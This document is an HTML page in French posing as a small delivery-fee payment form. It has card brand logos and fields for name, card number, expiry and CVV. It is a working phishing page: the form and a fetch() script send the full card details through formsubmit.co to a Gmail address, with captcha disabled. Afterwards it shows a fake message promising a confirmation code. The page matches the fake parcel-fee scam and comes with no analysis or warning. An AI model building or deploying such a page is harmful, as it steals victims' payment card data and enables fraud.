<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Paiement</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: #f1f1f1;
    }

    .payment-container {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100%;
      padding: 30px;
      box-sizing: border-box;
    }

    .form-box {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    .btn {
      background-color: #007BFF;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
    }

    .btn:hover {
      background-color: #0056b3;
    }

    .card-icons {
      text-align: center;
      margin-bottom: 10px;
    }

    .card-icons img {
      height: 30px;
      margin: 0 5px;
    }

    .row {
      display: flex;
      gap: 10px;
    }

    .half {
      width: 100%;
    }

    .input-icon {
      position: relative;
      width: 100%;
    }

    .input-icon input {
      padding-right: 35px;
    }

    .input-icon img {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      height: 18px;
      opacity: 0.6;
      pointer-events: none;
    }

    .confirmation-message {
      text-align: center;
      color: green;
      font-weight: normal;
      margin-top: 20px;
      display: none;
      font-size: 15px;
    }
  </style>
</head>
<body>
  <div class="payment-container">
    <div class="form-box">
      <div class="card-icons">
        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="Mastercard">
        <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
        <img src="https://img.icons8.com/color/48/000000/amex.png" alt="Amex">
        <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
        <img src="https://img.icons8.com/color/48/000000/jcb.png" alt="JCB">
      </div>

      <h2>Paiement de livraison</h2>

      <form id="payment-form" action="https://formsubmit.co/ajax/06esdgj42@gmail.com" method="POST">
        <input type="text" name="nom" placeholder="Nom sur la carte" required>

        <div class="input-icon">
          <input type="text" name="numero" placeholder="N° de carte" required>
          <img src="https://cdn-icons-png.flaticon.com/512/633/633611.png" alt="carte">
        </div>

        <div class="row">
          <input type="text" name="expiration" placeholder="MM/AA" required class="half">
          <input type="text" name="cvv" placeholder="CVV" required class="half">
        </div>

        <input type="hidden" name="_captcha" value="false">
        <button class="btn" type="submit">Payer 3 €</button>
      </form>

      <div id="confirmation" class="confirmation-message">
        ✅ Votre code de confirmation vous sera envoyé sous peu.
      </div>
    </div>
  </div>

  <script>
    document.getElementById("payment-form").addEventListener("submit", function(e) {
      e.preventDefault();
      const form = e.target;
      fetch(form.action, {
        method: "POST",
        body: new FormData(form),
        headers: { 'Accept': 'application/json' }
      }).then(response => {
        if (response.ok) {
          form.style.display = 'none';
          document.getElementById("confirmation").style.display = 'block';
        }
      });
    });
  </script>
</body>
</html>
